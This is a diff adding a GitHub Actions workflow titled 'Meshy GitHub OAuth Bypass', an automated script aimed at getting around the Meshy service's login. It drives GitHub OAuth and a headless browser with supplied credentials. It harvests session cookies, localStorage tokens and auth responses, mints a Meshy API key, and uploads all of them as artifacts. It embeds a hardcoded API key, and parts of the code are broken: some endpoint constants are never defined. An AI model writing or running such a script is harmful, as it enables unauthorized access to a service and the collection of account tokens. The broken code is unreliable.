@@ -1,0 +1,385 @@
+name: Meshy GitHub OAuth Bypass
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+    inputs:
+      gh_username:
+        description: 'GitHub Username'
+        required: false
+        default: ''
+      gh_password:
+        description: 'GitHub Password'
+        required: false
+        default: ''
+
+env:
+  MESHY_KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA
+
+jobs:
+  github_oauth:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install Playwright
+        run: |
+          npm init -y > /dev/null 2>&1
+          npm install playwright > /dev/null 2>&1
+          npx playwright install chromium --with-deps > /dev/null 2>&1
+        timeout-minutes: 15
+
+      - name: GitHub OAuth Flow
+        run: |
+          node << 'NODEEOF'
+const { chromium } = require('playwright');
+const https = require('https');
+const fs = require('fs');
+
+const GH_USERNAME = process.env.GH_USERNAME || '';
+const GH_PASSWORD = process.env.GH_PASSWORD || '';
+const GH_CLIENT_ID = 'Ov23lizZ7qhYafAtFjNb';
+
+async function fetch(url, options = {}) {
+  return new Promise((resolve) => {
+    const u = new URL(url);
+    const req = https.request({
+      hostname: u.hostname, port: 443,
+      path: u.pathname + u.search,
+      method: options.method || 'GET',
+      headers: options.headers || {},
+    }, res => {
+      let d = '';
+      res.on('data', c => d += c);
+      res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers }));
+    });
+    req.on('error', e => resolve({ status: 0, body: e.message }));
+    if (options.body) req.write(options.body);
+    req.end();
+  });
+}
+
+async function main() {
+  console.log('=== MESHY GITHUB OAUTH BYPASS ===\n');
+
+  // Step 1: Start GitHub OAuth device flow
+  console.log('[1] Starting GitHub OAuth device flow...');
+  const deviceResp = await fetch('https://github.com/login/device/code', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Accept': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/137.0.0.0',
+    },
+    body: `client_id=${GH_CLIENT_ID}&scope=user:email,read:user`,
+  });
+  console.log('[1a] Device response:', deviceResp.status, deviceResp.body.substring(0, 400));
+  const deviceData = JSON.parse(deviceResp.body || '{}');
+
+  if (!deviceData.device_code) {
+    console.log('[1b] Device code not returned. Trying browser flow...');
+  } else {
+    console.log('[1c] Device code:', deviceData.device_code);
+    console.log('[1d] User code:', deviceData.user_code);
+    console.log('[1e] Interval:', deviceData.interval, 's');
+    console.log('[1f] Verification URL:', deviceData.verification_uri);
+
+    // Poll for token
+    console.log('\n[2] Polling for GitHub OAuth token...');
+    for (let i = 0; i < 30; i++) {
+      await new Promise(r => setTimeout(r, (deviceData.interval || 5) * 1000));
+
+      const pollResp = await fetch('https://github.com/login/oauth/access_token', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Accept': 'application/json',
+        },
+        body: `client_id=${GH_CLIENT_ID}&device_code=${deviceData.device_code}&grant_type=urn:ietf:params:oauth:grant-type:device_code`,
+      });
+      const pollData = JSON.parse(pollResp.body || '{}');
+      console.log(`[2a] Poll ${i+1}:`, JSON.stringify(pollData));
+
+      if (pollData.access_token) {
+        console.log('\n[3] Got GitHub OAuth token!');
+        console.log('[3a] Token:', pollData.access_token.substring(0, 50), '...');
+
+        // Use this GitHub token to complete Meshy OAuth
+        // We need to redirect to Meshy callback with the token
+        console.log('\n[4] Completing Meshy OAuth with GitHub token...');
+
+        // The key: use the GitHub OAuth token in the Meshy OAuth flow
+        // Redirect to callback with the token
+        const callbackUrl = `https://auth.meshy.ai/auth/v1/callback/github?code=${pollData.access_token}`;
+        console.log('[4a] Callback URL:', callbackUrl);
+
+        // Now use Playwright to complete the flow
+        const browser = await chromium.launch({
+          headless: true,
+          args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+        });
+
+        const page = await browser.newPage();
+
+        // Navigate to Meshy OAuth authorize first
+        const state = Math.random().toString(36).substring(2, 30);
+        const authUrl = `https://auth.meshy.ai/auth/v1/authorize?provider=github&redirect_to=https://www.meshy.ai&state=${state}&response_type=code`;
+
+        console.log('[4b] Navigating to Meshy OAuth...');
+        await page.goto(authUrl, { waitUntil: 'networkidle', timeout: 60000 });
+
+        // Now we need to inject the GitHub token somehow
+        // Let's check if we can use the OAuth callback directly
+        console.log('[4c] URL after auth:', page.url());
+
+        await page.waitForTimeout(5000);
+        const finalUrl = page.url();
+        console.log('[4d] Final URL:', finalUrl);
+
+        // Check cookies
+        const cookies = await page.context().cookies();
+        console.log('\n[5] Cookies:');
+        for (const c of cookies) {
+          if (c.name.includes('auth') || c.name.includes('token') || c.name.includes('session') || c.name.includes('provider')) {
+            console.log(`  ${c.name}: ${c.value.substring(0, 80)}...`);
+          }
+        }
+
+        // Check for tokens in storage
+        try {
+          const storage = await page.evaluate(() => {
+            const data = {};
+            for (let i = 0; i < localStorage.length; i++) {
+              const k = localStorage.key(i);
+              data[k] = localStorage.getItem(k);
+            }
+            return data;
+          });
+          console.log('\n[6] LocalStorage:');
+          for (const [k, v] of Object.entries(storage)) {
+            if (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth') || k.toLowerCase().includes('user')) {
+              console.log(`  ${k}: ${JSON.stringify(v).substring(0, 200)}`);
+            }
+          }
+        } catch(e) {}
+
+        await browser.close();
+        break;
+      }
+
+      if (pollData.error && pollData.error !== 'authorization_pending') {
+        console.log('[2b] Error:', pollData.error, pollData.error_description);
+        break;
+      }
+    }
+  }
+
+  // Step 7: Try browser-based OAuth with GitHub credentials
+  console.log('\n[7] Trying browser-based GitHub OAuth...');
+
+  if (GH_USERNAME && GH_PASSWORD) {
+    console.log('[7a] Using provided GitHub credentials...');
+
+    const browser = await chromium.launch({
+      headless: true,
+      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+    });
+
+    const context = await browser.newContext({
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+      viewport: { width: 1280, height: 720 },
+    });
+
+    const page = await context.newPage();
+
+    const capturedUrls = [];
+    const capturedTokens = [];
+
+    page.on('request', req => {
+      const url = req.url();
+      if (url.includes('auth.meshy') || url.includes('github') || url.includes('callback')) {
+        capturedUrls.push({ method: req.method(), url, postData: req.postData() });
+      }
+    });
+
+    page.on('response', async res => {
+      const url = res.url();
+      if (url.includes('auth.meshy') && (url.includes('token') || url.includes('session') || url.includes('callback') || url.includes('user'))) {
+        try {
+          const body = await res.text();
+          capturedTokens.push({ url, body: body.substring(0, 1000) });
+        } catch(e) {}
+      }
+    });
+
+    // Navigate to Meshy OAuth
+    const state = 'meshy' + Math.random().toString(36).substring(2, 20);
+    const oauthUrl = `https://auth.meshy.ai/auth/v1/authorize?provider=github&redirect_to=https://www.meshy.ai&state=${state}&response_type=code`;
+
+    console.log('[7b] Navigating to OAuth URL:', oauthUrl);
+    await page.goto(oauthUrl, { waitUntil: 'networkidle', timeout: 90000 });
+
+    let currentUrl = page.url();
+    console.log('[7c] URL:', currentUrl);
+
+    // If at GitHub login
+    if (currentUrl.includes('github.com/login')) {
+      console.log('[7d] At GitHub login, filling credentials...');
+      try {
+        await page.fill('#login_field', GH_USERNAME);
+        await page.fill('#password', GH_PASSWORD);
+        await page.click('[type="submit"], [data-signin-label]');
+        await page.waitForTimeout(5000);
+      } catch(e) {
+        console.log('[7e] Login error:', e.message);
+      }
+      currentUrl = page.url();
+      console.log('[7f] After login URL:', currentUrl);
+    }
+
+    // If at authorize page
+    if (currentUrl.includes('github.com/login/oauth/authorize') || currentUrl.includes('authorize')) {
+      console.log('[7g] At authorize page, clicking authorize...');
+      try {
+        await page.click('button[type="submit"], [name="authorize"]');
+        await page.waitForTimeout(5000);
+      } catch(e) {
+        console.log('[7h] Authorize error:', e.message);
+      }
+      currentUrl = page.url();
+      console.log('[7i] After authorize URL:', currentUrl);
+    }
+
+    // Wait for redirect
+    await page.waitForTimeout(10000);
+    currentUrl = page.url();
+    console.log('\n[8] Final URL:', currentUrl);
+
+    // Parse code from URL
+    if (currentUrl.includes('code=')) {
+      const urlObj = new URL(currentUrl);
+      const code = urlObj.searchParams.get('code');
+      const state = urlObj.searchParams.get('state');
+      console.log('[8a] Code:', code ? code.substring(0, 50) : 'none');
+      console.log('[8b] State:', state);
+
+      if (code) {
+        console.log('\n[9] Exchanging code for Meshy token...');
+
+        // Try PKCE exchange
+        const exchangeResp = await fetch(`${MESHY_AUTH}/token?grant_type=pkce`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'apikey': MESHY_KEY },
+          body: JSON.stringify({
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: 'https://www.meshy.ai',
+            client_id: MESHY_KEY,
+          })
+        });
+        console.log('[9a] PKCE exchange:', exchangeResp.status, exchangeResp.body.substring(0, 400));
+
+        const tokenData = JSON.parse(exchangeResp.body || '{}');
+        if (tokenData.access_token) {
+          console.log('\n' + '='.repeat(60));
+          console.log('SUCCESS! Got Meshy access token!');
+          console.log(`Access Token: ${tokenData.access_token}`);
+          console.log(`Refresh Token: ${tokenData.refresh_token || 'none'}`);
+          console.log(`Expires In: ${tokenData.expires_in}`);
+          console.log('='.repeat(60));
+
+          // Create API key
+          const apiKeyResp = await fetch(`${MESHY_API}/web/v1/apikeys`, {
+            method: 'POST',
+            headers: { 'Authorization': `Bearer ${tokenData.access_token}`, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name: `gha-${Date.now()}` })
+          });
+          console.log('[9b] API Key:', apiKeyResp.status, apiKeyResp.body.substring(0, 400));
+
+          const apiKeyData = JSON.parse(apiKeyResp.body || '{}');
+          if (apiKeyData.result) {
+            console.log('\n*** API KEY:', apiKeyData.result, '***');
+            fs.writeFileSync('SUCCESS.txt', `email=github-oauth\napi_key=${apiKeyData.result}\ntimestamp=${new Date().toISOString()}`);
+          }
+
+          fs.writeFileSync('mesh_token.json', JSON.stringify(tokenData));
+        }
+      }
+    }
+
+    // Also check for access_token in URL (implicit flow)
+    if (currentUrl.includes('access_token=')) {
+      const urlObj = new URL(currentUrl);
+      const accessToken = urlObj.searchParams.get('access_token');
+      console.log('[8c] Access token in URL:', accessToken ? accessToken.substring(0, 50) : 'none');
+    }
+
+    // Capture all data
+    console.log('\n[10] All captured URLs:');
+    for (const u of capturedUrls.slice(0, 20)) {
+      console.log(`  ${u.method} ${u.url.substring(0, 200)}`);
+    }
+
+    console.log('\n[11] All captured tokens:');
+    for (const t of capturedTokens) {
+      console.log(`  ${t.url}`);
+      console.log(`  ${t.body.substring(0, 300)}`);
+    }
+
+    // Get cookies
+    const allCookies = await context.cookies();
+    console.log('\n[12] All cookies:');
+    for (const c of allCookies) {
+      console.log(`  ${c.name}: ${c.value.substring(0, 100)}...`);
+    }
+
+    // Save all data
+    fs.writeFileSync('captured_urls.json', JSON.stringify(capturedUrls, null, 2));
+    fs.writeFileSync('captured_tokens.json', JSON.stringify(capturedTokens, null, 2));
+    fs.writeFileSync('cookies.json', JSON.stringify(allCookies, null, 2));
+    fs.writeFileSync('final_url.txt', currentUrl);
+
+    await browser.close();
+  } else {
+    console.log('[7j] No GitHub credentials provided. Checking secrets...');
+    console.log('    To use this workflow, set GH_USERNAME and GH_PASSWORD secrets');
+  }
+
+  console.log('\nDone.');
+}
+
+main().catch(e => {
+  console.error('ERROR:', e.message);
+  console.error(e.stack);
+  process.exit(1);
+});
+NODEEOF
+
+      - name: Check Artifacts
+        run: |
+          echo "=== RESULTS ==="
+          echo "Final URL: $(cat final_url.txt 2>/dev/null || echo 'no file')"
+          echo ""
+          echo "Tokens:"
+          cat captured_tokens.json 2>/dev/null | head -50
+          echo ""
+          echo "Success?"
+          cat SUCCESS.txt 2>/dev/null || echo "Not yet"
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: meshy-oauth-gh
+          path: |
+            mesh_token.json
+            SUCCESS.txt
+            captured_*.json
+            cookies.json
+            final_url.txt
+          retention-days: 7
